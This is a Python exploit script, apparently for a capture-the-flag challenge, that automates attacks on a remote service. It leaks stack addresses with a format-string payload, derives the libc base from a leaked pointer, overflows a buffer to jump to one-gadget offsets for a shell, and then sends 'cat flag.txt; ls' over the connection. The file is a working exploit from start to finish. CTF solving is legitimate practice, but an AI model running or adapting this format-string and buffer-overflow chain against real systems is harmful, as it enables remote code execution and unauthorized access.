import sys, re, time, socket, struct, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

LM = 0x21c87
GADGETS = [0x4f2c5, 0x4f322, 0x10a38c]
cy = CyLab(delay=0.5)
cy.login()
for g in GADGETS:
    cy.req("PUT", "/api/challenges/133/instance/?source=library")
    host = port = None
    for _ in range(10):
        st, b = cy.req("GET", "/api/challenges/133/instance/")
        d = json.loads(b) if b.startswith("{") else {}
        m = re.search(r"nc\s+(-v\s+)?([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
        if m:
            host, port = m.group(2), int(m.group(3))
            break
        time.sleep(0.4)
    if not host:
        print("pas de service")
        continue
    s = socket.create_connection((host, port), timeout=12)
    s.settimeout(2.0)
    s.sendall(("%p." * 60).encode() + b"\n")
    out = b""
    quiet = 0
    while quiet < 3:
        try:
            c = s.recv(16384)
            if not c:
                break
            out += c
            quiet = 0
        except socket.timeout:
            quiet += 1
    vals = [int(v, 16) for v in re.findall(rb"0x[0-9a-f]+", out)]
    base = None
    for v in vals:
        if 0x700000000000 <= v <= 0x7fffffffffff and v % 0x1000 == 0xc87:
            base = v - LM
            break
    if base is None:
        print("g=0x%x : pas de base" % g)
        s.close()
        continue
    payload = b"A" * 0x70 + b"B" * 8 + struct.pack("<Q", base + g)
    print("g=0x%-7x base=0x%x cible=0x%x" % (g, base, base + g))
    s.sendall(payload + b"\n")
    time.sleep(0.5)
    s.sendall(b"cat flag.txt; ls; echo FIN\n")
    res = b""
    t0 = time.time()
    while time.time() - t0 < 7:
        try:
            c = s.recv(8192)
            if not c:
                break
            res += c
            if b"FIN" in res:
                break
        except socket.timeout:
            break
    s.close()
    txt = res.decode("latin-1", "replace")
    print("   ->", txt[-200:].replace("\n", " ")[:200])
    m = re.search(r"\b[0-9a-f]{20,40}\b", txt)
    if m and ("flag.txt" in txt or "{" in txt):
        print("CANDIDAT FLAG:", m.group(0))
        break
